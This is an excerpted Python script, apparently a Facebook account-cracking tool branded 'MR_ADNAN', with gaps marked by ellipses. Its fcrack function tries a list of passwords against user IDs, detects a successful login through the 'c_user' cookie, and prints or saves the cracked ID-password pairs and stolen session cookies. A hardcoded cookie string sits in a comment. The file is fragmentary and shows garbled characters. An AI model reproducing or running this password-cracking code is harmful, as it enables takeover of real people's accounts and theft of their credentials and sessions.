...
os.system("xdg-open https://www.facebook.com/profile.php?id=100000609046908")
import uuid
...
| $$  | $$| $$  | $$| $$\  $$$| $$  | $$| $$\  $$$
| $$  | $$| $$$$$$$/| $$ \  $$| $$  | $$| $$ \  $$
|__/  |__/|_______/ |__/  \__/|__/  |__/|__/  \__/\033[1;37m 
====================================================
[â€¢] OWNER      : MR_ADNAN 
[â€¢] GITHUB     : M4STER_ADNAN
[â€¢] STATUS     : FREE
[â€¢] VERSION    : 0.1
===================================================="""
...
def fcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            # 'cookie': 'datr=UfPuZWcs-B8SBNtDU2aEalSi; sb=UfPuZbZ8Ony6bFD05TT2ZfpL; m_pixel_ratio=1.891728162765503; wd=572x1159; ps_l=0; ps_n=0; fr=0NrDF0fM1Cw5ZfRuE..Bl7vNR..AAA.0.0.Bl7vNa.AWWqz_Y0yGE',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[MR ADNAN-OK] '+uid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
               # print('\033[1;33m[MR ADNAN-CP] '+cid+' | '+ps+'\x1b[1;97m')
            #    open('MR ADNAN-CP.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mMR ADNAN\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
